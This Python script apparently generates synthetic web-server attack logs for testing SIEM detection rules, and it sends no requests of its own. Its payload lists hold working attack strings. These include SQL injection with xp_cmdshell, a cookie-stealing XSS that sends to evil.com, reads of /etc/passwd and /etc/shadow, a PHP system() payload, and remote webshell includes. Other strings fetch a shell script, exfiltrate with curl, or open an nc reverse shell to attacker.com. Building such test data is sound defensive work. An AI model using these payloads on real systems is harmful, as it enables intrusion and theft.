"""
╔══════════════════════════════════════════════════════════╗
║     WEB ATTACK SIMULATOR — SIEM Detection Project        ║
║  Simulates: SQLi, XSS, LFI, RFI, DirTraversal,          ║
║             Command Injection, Encoded Payloads           ║
╚══════════════════════════════════════════════════════════╝
"""

import urllib.parse
import base64
import random
import json
from datetime import datetime

# ─────────────────────────────────────────────
# ATTACK PAYLOAD LIBRARIES
# ─────────────────────────────────────────────

SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' UNION SELECT null,username,password FROM users--",
    "'; DROP TABLE users;--",
    "' AND SLEEP(5)--",
    "1' ORDER BY 3--",
    "' OR EXISTS(SELECT * FROM users)--",
    "admin'--",
    "' OR 'x'='x",
    "1; SELECT * FROM information_schema.tables",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "'; EXEC xp_cmdshell('whoami');--",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(document.cookie)",
    "<svg/onload=alert('xss')>",
    "'\"><script>document.location='http://evil.com/?c='+document.cookie</script>",
    "<body onload=alert('XSS')>",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",       # URL-encoded
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",  # HTML-encoded
    "<iframe src='javascript:alert(1)'></iframe>",
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../windows/system32/drivers/etc/hosts",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",   # URL-encoded
    "..%252f..%252f..%252fetc%252fpasswd",         # Double-encoded
    "/proc/self/environ",
    "../../../../var/log/apache2/access.log",
    "php://filter/convert.base64-encode/resource=index.php",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
]

RFI_PAYLOADS = [
    "http://evil.com/shell.txt",
    "https://attacker.io/malware.php",
    "ftp://evil.com/backdoor.php",
    "http://192.168.1.100/shell.php",
    "http://evil.com/c99.php?cmd=id",
]

COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| cat /etc/passwd",
    "`id`",
    "$(whoami)",
    "; ping -c 4 attacker.com",
    "|| net user",
    "& dir C:\\",
    "; wget http://evil.com/shell.sh -O /tmp/shell.sh",
    "; curl http://evil.com/exfil?data=$(cat /etc/passwd | base64)",
    "| nc -e /bin/sh attacker.com 4444",
]

DIR_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "%c0%af%c0%af%c0%afetc%c0%afpasswd",           # Unicode encoding
]

ENCODED_PAYLOADS = [
    # Base64 encoded XSS
    base64.b64encode(b"<script>alert('XSS')</script>").decode(),
    # Double URL-encoded SQLi
    urllib.parse.quote(urllib.parse.quote("' OR 1=1--")),
    # Hex-encoded command injection
    "".join([f"%{hex(ord(c))[2:].upper()}" for c in "; cat /etc/passwd"]),
    # Unicode-escaped XSS
    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    # HTML entity encoded
    "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert(1)&#60;/script&#62;",
]

SUSPICIOUS_USER_AGENTS = [
    "sqlmap/1.7.8#stable (https://sqlmap.org)",
    "Nikto/2.1.6",
    "Mozilla/5.0 (compatible; Googlebot/2.1)",
    "python-requests/2.28.0",
    "curl/7.84.0",
    "masscan/1.3",
    "Nmap Scripting Engine",
    "DirBuster-1.0-RC1",
    "w3af.org",
    "ZAP/2.12.0",
    "Acunetix Web Vulnerability Scanner",
    "Burp Suite Professional",
]

NORMAL_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
]

# ─────────────────────────────────────────────
# ATTACK SCENARIO BUILDER
# ─────────────────────────────────────────────

class AttackSimulator:
    def __init__(self):
        self.attack_log = []

    def _ts(self):
        return datetime.utcnow().strftime("%d/%b/%Y:%H:%M:%S +0000")

    def simulate_sqli(self):
        """SQL Injection via GET/POST parameters"""
        print("\n[*] Simulating SQL Injection Attacks...")
        attacks = []
        for payload in SQL_INJECTION_PAYLOADS:
            encoded = urllib.parse.quote(payload)
            entry = {
                "type": "SQL_INJECTION",
                "timestamp": self._ts(),
                "ip": f"10.0.0.{random.randint(1, 254)}",
                "method": random.choice(["GET", "POST"]),
                "uri": f"/login.php?username={encoded}&password=test",
                "raw_payload": payload,
                "encoded_payload": encoded,
                "status": random.choice([200, 500, 403]),
                "user_agent": random.choice(SUSPICIOUS_USER_AGENTS[:3])
            }
            attacks.append(entry)
            print(f"  ✓ SQLi: {payload[:50]}...")
        self.attack_log.extend(attacks)
        return attacks

    def simulate_xss(self):
        """Cross-Site Scripting via search/comment parameters"""
        print("\n[*] Simulating XSS Attacks...")
        attacks = []
        endpoints = ["/search", "/comment", "/profile", "/feedback"]
        for payload in XSS_PAYLOADS:
            encoded = urllib.parse.quote(payload)
            entry = {
                "type": "XSS",
                "timestamp": self._ts(),
                "ip": f"172.16.{random.randint(0,255)}.{random.randint(1,254)}",
                "method": "GET",
                "uri": f"{random.choice(endpoints)}?q={encoded}",
                "raw_payload": payload,
                "encoded_payload": encoded,
                "status": random.choice([200, 400]),
                "user_agent": random.choice(SUSPICIOUS_USER_AGENTS)
            }
            attacks.append(entry)
            print(f"  ✓ XSS: {payload[:50]}...")
        self.attack_log.extend(attacks)
        return attacks

    def simulate_lfi(self):
        """Local File Inclusion via file/page parameters"""
        print("\n[*] Simulating LFI Attacks...")
        attacks = []
        for payload in LFI_PAYLOADS:
            entry = {
                "type": "LFI",
                "timestamp": self._ts(),
                "ip": f"192.168.1.{random.randint(1, 254)}",
                "method": "GET",
                "uri": f"/index.php?page={urllib.parse.quote(payload)}",
                "raw_payload": payload,
                "status": random.choice([200, 404, 403, 500]),
                "user_agent": random.choice(SUSPICIOUS_USER_AGENTS)
            }
            attacks.append(entry)
            print(f"  ✓ LFI: {payload[:50]}...")
        self.attack_log.extend(attacks)
        return attacks

    def simulate_rfi(self):
        """Remote File Inclusion"""
        print("\n[*] Simulating RFI Attacks...")
        attacks = []
        for payload in RFI_PAYLOADS:
            entry = {
                "type": "RFI",
                "timestamp": self._ts(),
                "ip": f"203.0.113.{random.randint(1, 254)}",
                "method": "GET",
                "uri": f"/page.php?include={urllib.parse.quote(payload)}",
                "raw_payload": payload,
                "status": random.choice([200, 500]),
                "user_agent": random.choice(SUSPICIOUS_USER_AGENTS)
            }
            attacks.append(entry)
            print(f"  ✓ RFI: {payload}")
        self.attack_log.extend(attacks)
        return attacks

    def simulate_command_injection(self):
        """Command Injection via various input parameters"""
        print("\n[*] Simulating Command Injection Attacks...")
        attacks = []
        for payload in COMMAND_INJECTION_PAYLOADS:
            entry = {
                "type": "COMMAND_INJECTION",
                "timestamp": self._ts(),
                "ip": f"10.10.{random.randint(0,255)}.{random.randint(1,254)}",
                "method": random.choice(["GET", "POST"]),
                "uri": f"/ping?host={urllib.parse.quote(payload)}",
                "raw_payload": payload,
                "status": random.choice([200, 500]),
                "user_agent": random.choice(SUSPICIOUS_USER_AGENTS)
            }
            attacks.append(entry)
            print(f"  ✓ CMDi: {payload[:50]}")
        self.attack_log.extend(attacks)
        return attacks

    def simulate_dir_traversal(self):
        """Directory Traversal attacks"""
        print("\n[*] Simulating Directory Traversal Attacks...")
        attacks = []
        for payload in DIR_TRAVERSAL_PAYLOADS:
            entry = {
                "type": "DIR_TRAVERSAL",
                "timestamp": self._ts(),
                "ip": f"198.51.100.{random.randint(1, 254)}",
                "method": "GET",
                "uri": f"/download?file={urllib.parse.quote(payload)}",
                "raw_payload": payload,
                "status": random.choice([200, 404, 403]),
                "user_agent": random.choice(SUSPICIOUS_USER_AGENTS)
            }
            attacks.append(entry)
            print(f"  ✓ DirTraversal: {payload[:50]}")
        self.attack_log.extend(attacks)
        return attacks

    def simulate_encoded_attacks(self):
        """Encoded/obfuscated payloads"""
        print("\n[*] Simulating Encoded/Obfuscated Payloads...")
        attacks = []
        for payload in ENCODED_PAYLOADS:
            entry = {
                "type": "ENCODED_ATTACK",
                "timestamp": self._ts(),
                "ip": f"10.0.{random.randint(0,255)}.{random.randint(1,254)}",
                "method": "GET",
                "uri": f"/search?q={payload}",
                "raw_payload": payload,
                "encoding_type": random.choice(["base64", "url-double", "hex", "unicode", "html-entity"]),
                "status": random.choice([200, 400, 403]),
                "user_agent": random.choice(SUSPICIOUS_USER_AGENTS)
            }
            attacks.append(entry)
            print(f"  ✓ Encoded: {payload[:60]}...")
        self.attack_log.extend(attacks)
        return attacks

    def simulate_error_spike(self, count=50):
        """Simulate error spike (scanner/brute-force behavior)"""
        print(f"\n[*] Simulating Error Spike ({count} requests)...")
        attacks = []
        ip = f"185.220.{random.randint(100,200)}.{random.randint(1,254)}"
        paths = ["/admin", "/wp-admin", "/.env", "/config.php", "/backup.zip",
                 "/phpmyadmin", "/.git/config", "/server-status", "/api/v1/users"]
        for i in range(count):
            entry = {
                "type": "ERROR_SPIKE",
                "timestamp": self._ts(),
                "ip": ip,
                "method": "GET",
                "uri": random.choice(paths),
                "status": random.choices([404, 403, 500, 401], weights=[50, 25, 15, 10])[0],
                "user_agent": random.choice(SUSPICIOUS_USER_AGENTS)
            }
            attacks.append(entry)
        print(f"  ✓ Generated {count} error spike requests from {ip}")
        self.attack_log.extend(attacks)
        return attacks

    def simulate_brute_force(self, attempts=30):
        """Login brute force simulation"""
        print(f"\n[*] Simulating Brute Force Login ({attempts} attempts)...")
        attacks = []
        ip = f"45.33.{random.randint(1,254)}.{random.randint(1,254)}"
        passwords = ["123456", "password", "admin", "letmein", "qwerty", "abc123"]
        for i in range(attempts):
            entry = {
                "type": "BRUTE_FORCE",
                "timestamp": self._ts(),
                "ip": ip,
                "method": "POST",
                "uri": "/login",
                "body": f"username=admin&password={random.choice(passwords)}",
                "status": 401,
                "user_agent": random.choice(SUSPICIOUS_USER_AGENTS + NORMAL_USER_AGENTS)
            }
            attacks.append(entry)
        print(f"  ✓ Generated {attempts} brute force attempts from {ip}")
        self.attack_log.extend(attacks)
        return attacks

    def run_all(self):
        """Run all attack simulations"""
        print("=" * 60)
        print("  WEB ATTACK SIMULATOR — Starting All Scenarios")
        print("=" * 60)
        self.simulate_sqli()
        self.simulate_xss()
        self.simulate_lfi()
        self.simulate_rfi()
        self.simulate_command_injection()
        self.simulate_dir_traversal()
        self.simulate_encoded_attacks()
        self.simulate_error_spike()
        self.simulate_brute_force()

        print(f"\n{'='*60}")
        print(f"  Total Attack Records Generated: {len(self.attack_log)}")
        print(f"{'='*60}")

        # Save to JSON
        with open("sample_logs/attack_simulation.json", "w") as f:
            json.dump(self.attack_log, f, indent=2)
        print("\n  [✓] Saved to sample_logs/attack_simulation.json")
        return self.attack_log


# ─────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────
if __name__ == "__main__":
    import os
    os.makedirs("sample_logs", exist_ok=True)
    sim = AttackSimulator()
    logs = sim.run_all()

    print("\n[SUMMARY BY TYPE]")
    from collections import Counter
    types = Counter(l["type"] for l in logs)
    for attack_type, count in types.most_common():
        print(f"  {attack_type:<25} : {count} events")
